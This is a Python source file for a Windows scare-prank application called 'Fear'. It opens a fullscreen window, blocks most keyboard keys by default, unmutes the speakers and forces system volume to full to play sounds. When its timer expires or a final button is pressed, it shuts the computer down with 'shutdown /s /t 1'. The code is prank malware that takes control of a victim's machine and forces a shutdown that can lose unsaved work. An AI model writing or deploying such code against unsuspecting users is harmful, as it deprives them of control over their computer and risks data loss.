import os
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from tkinter import *
from tkinter import ttk
import pygame
import keyboard as kb

pygame.init()
pygame.mixer.init()
devices = AudioUtilities.GetSpeakers()
interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
sys_vol = cast(interface, POINTER(IAudioEndpointVolume))


class FearClassException(Exception):
    """
    Custom exception class for Fear class.
    """
    pass


class Fear:
    """
    Class for creating application with buttons and images.
    """

    def __init__(self, fullscreen: bool = True, title: str = "Выбрался всё таки", time: int = 30,
                 main_text: str = "Ваши действия?", main_image: str = "", kb_block: bool = True, volume: int = 100):
        """
        Initialize the Fear class.
        :param fullscreen: Flag for displaying the window in fullscreen mode.
        :param title: Window title.
        :param time: Time in seconds before closing the window.
        :param main_text: Text on the main scene.
        :param main_image: Path to the image on the main scene.
        :param kb_block: Flag for blocking the keyboard.
        :param volume: Sound volume level.
        """
        if main_image and not os.path.exists(main_image):
            raise FearClassException(f'Image "{main_image}" does not exist.')
        if volume < 0 or volume > 100:
            raise FearClassException("The volume should be between 0 and 100.")

        self.wind = Tk()
        self.wind.title(title)
        self.w_size = (self.wind.winfo_screenwidth(), self.wind.winfo_screenheight())
        self.wind.geometry(f"{self.w_size[0]}x{self.w_size[1]}")
        self.wind.attributes('-fullscreen', fullscreen)

        self.scenes, self.buttons, self.data = {"main": Frame(self.wind), }, {}, {
            "main": [PhotoImage(file=main_image), main_text]}
        self._state = "main"
        self.time, self.volume, self.main_text, self.running, self.block = time, volume, main_text, False, kb_block
        self.main_image = None
        self.on_quit = lambda: os.system("shutdown /s /t 1")

    @property
    def state(self):
        """
        Getter for the current scene name
        :return: Current scene name.
        """
        return self._state

    @state.setter
    def state(self, new_state: str):
        """
        Setter for the current scene name.
        :param new_state: New current scene name.
        """
        self.scenes[self._state].pack_forget()
        self._state = new_state
        self.scenes[self._state].pack()

    def setup(self):
        """
        Setup the label and buttons.
        """
        for sc in self.scenes.keys():
            lb = ttk.Label(self.scenes[sc], text=self.data[sc][1], font=("Arial", 30), image=self.data[sc][0],
                           justify=CENTER, anchor="center", compound="bottom")
            lb.pack()
        for but in self.buttons.keys():
            self.buttons[but].pack()

    def run(self):
        """
        Run the application.
        """
        if not self.running:
            self.running = True
            if self.time < 0:
                raise FearClassException("The time should be >= 0.")
            if self.block:
                Fear.block_keyboard()
            self.setup()
            self.wind.after(self.time * 1000, self.on_quit)
            self.wind.after(self.time * 1000 + 1, self.wind.quit)
            self.state = "main"
            self.wind.mainloop()

    def add_scene(self, name: str, button_text: str = "", image: str = None, sound: str = None, text: str = "",
                  final: bool = False, time: int = 4):
        """
        Add a new scene.
        :param name: Scene name.
        :param text: Text on the scene.
        :param image: Path to the image on the scene.
        :param sound: Path to the sound on the scene.
        :param button_text: Text on the button.
        :param final: Flag for ending the game. Default is False.
        :param time: Time in seconds before closing the scene. Default is 4.
        """
        if name in self.scenes.keys():
            raise FearClassException(f'Scene "{name}" already exists.')
        if image and not os.path.exists(image):
            raise FearClassException(f'Image "{image}" does not exist.')
        if sound and not os.path.exists(sound):
            raise FearClassException(f'Sound "{sound}" does not exist.')

        self.scenes[name] = Frame(self.wind)
        self.buttons[name] = ttk.Button(self.scenes["main"], text=button_text, width=self.w_size[0], style="W.TButton",
                                        command=lambda: self._button_function(name, sound, final, time))
        self.data[name] = [PhotoImage(file=image) if image else None, text]

    def _button_function(self, scene_name, sound, final=False, time=4):
        """
        Button function.
        :param scene_name: Scene name.
        :param sound: Path to the sound.
        :param final: Flag for ending the game.
        :param time: Time in seconds before closing the scene. Default is 4.
        """
        if scene_name not in self.scenes.keys():
            raise FearClassException(f'Scene "{scene_name}" does not exist.')
        self.state = scene_name
        if sound:
            Fear.play_sound(sound, self.volume)
        if final:
            self.wind.after(time * 1000, self.on_quit)
            self.wind.after(time * 1000 + 1, self.wind.quit)
        else:
            self.buttons[scene_name].configure(state="disabled")

            def return_menu():
                self.state = "main"

            self.wind.after(time * 1000, lambda: return_menu())

    @staticmethod
    def play_sound(sound: str, volume: int):
        """
        Play a sound.
        :param sound: Path to the sound.
        :param volume: Sound volume level.
        """
        if not os.path.exists(sound):
            raise FearClassException(f'Sound "{sound}" does not exist.')
        sys_vol.SetMute(0, None)
        sys_vol.SetMasterVolumeLevelScalar(volume / 100, None)
        pygame.mixer.music.load(sound)
        pygame.mixer.music.play()

    @staticmethod
    def block_keyboard(reverse: bool = False):
        """
        Block the keyboard.
        :param reverse: Flag for unblocking the keyboard.
        """
        for i in range(150):
            if reverse:
                kb.unblock_key(i)
            else:
                kb.block_key(i)
